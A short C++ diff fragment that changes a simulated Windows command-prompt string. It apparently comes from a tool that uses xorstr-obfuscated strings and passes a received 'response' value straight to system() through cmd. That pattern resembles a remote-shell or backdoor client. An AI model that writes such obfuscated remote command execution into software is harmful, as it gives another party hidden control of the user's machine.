@@ -79,7 +79,7 @@ auto main( ) -> int {
 
 			system( ( xorstr( "cmd /S /C \"" ) + config::response + xorstr( "\"" ) ).c_str( ) );
 
-			std::cout << xorstr( "\nC:\\Users\\headed>" );
+			std::cout << xorstr( "\nC:\\Users\\" ) << pc_name << xorstr( ">" );
 		}
 	}
 
